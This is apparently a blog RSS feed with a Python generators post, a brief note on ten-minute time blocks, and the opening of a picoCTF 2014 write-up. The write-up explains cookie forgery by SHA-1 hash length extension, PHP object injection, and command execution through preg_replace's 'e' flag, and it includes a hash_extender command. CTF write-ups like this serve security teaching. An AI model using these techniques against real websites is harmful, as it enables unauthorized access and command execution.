plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> to_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        send_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">lines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># ----</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Functional programming inversion of modal control on just the formatting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">template </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"{region:&lt;{align}}    {profit}"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">accounting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Here's where "Pythonic" approaches are unreadable BS imo:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># return {1: " {:10,}", -1: "({:&gt;10,})", 0: " {:&gt;10}".format("-")}[(p &gt; 0) - (p &lt; 0)].format(abs(p))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">match</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">p </span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> p </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)"># Structural pattern matching is good as of 3.10, use it!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">" {:10,}"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token boolean">False</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"({:&gt;10,})"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">-</span><span class="token plain">p</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">_</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">" {:&gt;10}"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token builtin" style="color:rgb(189, 147, 249)">format</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"-"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">output_functional</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    write</span><span class="token operator">=</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    template</span><span class="token operator">=</span><span class="token plain">template</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    accounting</span><span class="token operator">=</span><span class="token plain">accounting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    align </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">max</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">map</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> region</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> profit </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">items</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        write</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">template</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">region</span><span class="token operator">=</span><span class="token plain">region</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> profit</span><span class="token operator">=</span><span class="token plain">accounting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">profit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> align</span><span class="token operator">=</span><span class="token plain">align</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># ----</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Even better yet, invert more modal control on the output using generators</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">output_generators</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    template</span><span class="token operator">=</span><span class="token plain">template</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    accounting</span><span class="token operator">=</span><span class="token plain">accounting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Generator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    align </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">max</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">map</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> region</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> profit </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> markets</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">items</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        line </span><span class="token operator">=</span><span class="token plain"> template</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">region</span><span class="token operator">=</span><span class="token plain">region</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> profit</span><span class="token operator">=</span><span class="token plain">accounting</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">profit</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> align</span><span class="token operator">=</span><span class="token plain">align</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> line</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> __name__ </span><span class="token operator">==</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"__main__"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    markets_data </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">"New York"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token number">150000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">"London"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token operator">-</span><span class="token number">50000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">"Tokyo"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token number">120000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">"Berlin"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token string" style="color:rgb(255, 121, 198)">"Shanghai"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token number">210000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Output modal is a monstrosity internally to read and maintain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    output_modal</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        markets_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to_log</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to_email</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        accounting</span><span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Even though output with functional style is easier to maintain,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># it's still harder to call:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    email_lines </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    write_log </span><span class="token operator">=</span><span class="token plain"> logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    write_email </span><span class="token operator">=</span><span class="token plain"> email_lines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">append</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    output_functional</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">markets_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> write</span><span class="token operator">=</span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    output_functional</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">markets_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> write</span><span class="token operator">=</span><span class="token plain">write_log</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    output_functional</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">markets_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> write</span><span class="token operator">=</span><span class="token plain">write_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    send_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">email_lines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Whereas output with generators is much cleaner:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    email_lines </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> line </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> output_generators</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">markets_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">info</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">line</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    send_email</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">join</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">email_lines</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<p>While my preferences usually lean toward a functional approach, the generators have additional advantages.
The generator approach is shorter, and I would argue significantly clearer, because all necessary context about the output modalities is correctly placed with the calling code.
The maintainability is also improved, as formatting changes only touch the formatting functions, data structure changes only touch the function internals, and output interface changes are in one place with the caller.</p>
<p>Additionally, the generators can also have a different or better runtime profile over the functional one, during scenarios where the number of alternations is very high (since each "turn taking" step alternates between pre-existing function frames that are paused and resumed instead of creating and destroying them repeatedly).
Just be warned, this isn't unilaterally true, as there is additional overhead for constructing the <code>Generator</code> object, which a function call does not incur.</p>
<p>Those topics, Lazy-like expressions and sequences and control flow alternation, was about where my understanding of generators stopped until recently. The <a href="https://clifford.ressel.fyi/blog/python-generators-part2">second part of this article</a> may introduce one or two new code abstractions for your toolbox, as it did for me!</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[10 minute moments]]></title>
            <link>https://clifford.ressel.fyi/blog/many-minutes-few-moments</link>
            <guid>https://clifford.ressel.fyi/blog/many-minutes-few-moments</guid>
            <pubDate>Sun, 28 May 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[16 waking hours ÷ 10 minutes = 96]]></description>
            <content:encoded><![CDATA[<blockquote>
<p>16 waking hours ÷ 10 minutes = 96</p>
<p>10 minutes is ~1% of your day.</p>
</blockquote>
<p>- <a href="https://taylor.town/10-minutes" target="_blank" rel="noopener noreferrer">credit to Taylor Troesh</a></p>
<p>When the phone scrolling lasts for 10 minutes, or low-priority yak shaving adds up to 10 minutes, that's one percent of your day spent.
That's not necessarily a bad thing or a good thing, but make sure it's a thing you want to have spent one percent of your day on.</p>
<p>You only have this many 10 minute moments.</p>
<pre style="width:min-content"><p>🥱  📱  🪥  🍳  🥐  📱
☕  🧥  💻  💻  💻  🚽
💬  📧  🎧  💻  📞  💻
💻  💻  💻  💻  ☕  💻
📞  💻  📱  🎧  💻  💻
💬  💻  📱  🍱  🍱  📱
☕  💻  📞  💻  💻  🎧
🚽  📱  💻  💻  📧  💻
💻  💻  💻  💻  💻  💻
💻  💬  🥪  📱  💻  🚗
🛒  🛒  🚗  🥏  🥏  🏃
🏃  🥏  🥏  🥏  🏋️  🏋️
🏋️  🏋️  🧘  🧘  🚗  🚗
🛁  🍲  🍲  📺  📺  📱
📺  💻  🚽  💻  💻  💻
🪥  📖  📖  📖  📖  🛌</p></pre>
<p>Many minutes, but few moments.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[picoCTF 2014 part 3: Steve's List]]></title>
            <link>https://clifford.ressel.fyi/blog/picoctf-2014-part3</link>
            <guid>https://clifford.ressel.fyi/blog/picoctf-2014-part3</guid>
            <pubDate>Mon, 01 Dec 2014 00:00:00 GMT</pubDate>
            <description><![CDATA[Summary]]></description>
            <content:encoded><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="summary">Summary<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#summary" class="hash-link" aria-label="Direct link to Summary" title="Direct link to Summary">​</a></h2>
<p>Hash extension allows us to enter whatever cookies we choose, without knowledge of the secret, and still pass the website’s checks. Since the cookie is unserialized, we can inject arbitrary php objects into the server. By injecting a Post object, we know it’s destroy method will be called. This method has been redefined to output the Post’s fields in HTML comments after parsing them with the class Filter. The Filter operates by running the given text through preg_replace calls with stored params for match and substitution. As we have injected the object, we have complete control over these stored params, and can thus call the preg_replace with the ‘e’ flag, allowing us to do arbitrary command execution. By catting the necessary file at <code>/home/daedalus/flag.txt</code>, and substituting all of the Post’s text with the file’s contents, we can print the file’s contents in an HTML comment, and thus get the flag.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-hash-extension">The Hash Extension<a href="https://clifford.ressel.fyi/blog/picoctf-2014-part3#the-hash-extension" class="hash-link" aria-label="Direct link to The Hash Extension" title="Direct link to The Hash Extension">​</a></h2>
<p>Examination of the hacked website shows the only possible input is through the cookies.
However, any attempts to manipulate the cooke result in us being locked out of the website.</p>
<p>Examination of the website source makes it quickly apparent why:</p>
<div class="language-PHP language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$custom_settings = urldecode($_COOKIE['custom_settings']);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$hash = sha1(AUTH_SECRET . $custom_settings);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if ($hash !== $_COOKIE['custom_settings_hash']) {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  die("Why would you hack Section Chief Steve's site? :(");</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>The cookie <code>custom_settings</code> will later be deserialized, and will be the site of our object inject. However, <code>custom_settings_hash</code> will need to change in a similar manner.</p>
<p>To not fail the validation, <code>custom_settings_hash</code> needs to be of the form <code>sha1(AUTH_SECRET . urldecode($_COOKIE['custom_settings']))</code> where <code>AUTH_SECRET</code> is an unknown, eight letter secret.
As we do not have access to <code>AUTH_SECRET</code>, it would appear that we are unable to change the <code>custom_settings</code> cookie.</p>
<p>However, using a hash extension attack, we can change the value of <code>custom_settings_hash</code> to correspond to our new value of <code>custom_settings</code> without knowledge of the <code>AUTH_SECRET</code>.</p>
<p>The tool to be used is called <a href="https://github.com/iagox86/hash_extender">hash extender</a>. By downloading and compiling the program, we can generate the new value of <code>custom_settings_hash</code> with the following command:</p>
<div class="language-Shell language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ./hash_extender --data d --secret 8 --append a --signature s --format sha1 --table</span><br></span></code></pre></div></div>
<p>where <code>d</code> is the previous <code>custom_settings</code>, <code>a</code> is the addition to the <code>custom_settings</code> (or the object injection), and s is the previous value of <code>custom_settings_hash</code>.</p>
<p>With this value, we can now manipulate <code>custom_settings</code> without tripping Steve’s rudimentary IPS.</p>
